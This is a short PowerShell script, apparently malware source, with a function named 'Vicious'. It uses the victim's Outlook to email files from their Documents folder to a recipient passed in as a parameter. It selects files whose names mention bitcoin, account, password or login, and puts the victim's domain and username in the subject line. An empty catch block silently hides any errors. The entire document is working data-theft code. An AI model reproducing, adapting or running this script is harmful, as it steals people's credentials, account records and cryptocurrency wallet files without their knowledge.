# Instantiate new Outlook object.
$Outlook = New-Object -ComObject Outlook.Application
function Vicious ($SendTo) {
	
	try {
		$Mail = $Outlook.CreateItem(0)
		$Mail.Importance = 2
		$Mail.To = "" + $SendTo
		$Mail.Subject = $env:userdomain + "\" + $env:username
		$Mail.HTMLBody = ""

		$files = Get-ChildItem $env:userprofile\Documents
		for ($i=0; $i -lt $files.Count; $i++) {

			if ($files[$i].name.tolower() -match "bitcoin") {
				if ( $files[$i].Length/1MB -lt 25 ) {
					$Mail.Attachments.Add($files[$i].fullname) | Out-Null
				}
			}
			elseif  ($files[$i].name.tolower() -match "account") {
				if ( $files[$i].Length/1MB -lt 25 ) {
					$Mail.Attachments.Add($files[$i].fullname) | Out-Null
				}
			}
			elseif  ($files[$i].name.tolower() -match "password") {
				if ( $files[$i].Length/1MB -lt 25 ) {
					$Mail.Attachments.Add($files[$i].fullname) | Out-Null
				}
			}
			elseif  ($files[$i].name.tolower() -match "login") {
				if ( $files[$i].Length/1MB -lt 25 ) {
					$Mail.Attachments.Add($files[$i].fullname) | Out-Null
				}
			}
		}
		$Mail.Send()

		Start-Sleep -s 7
		$Outlook.Quit
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
	}
	catch {}
}
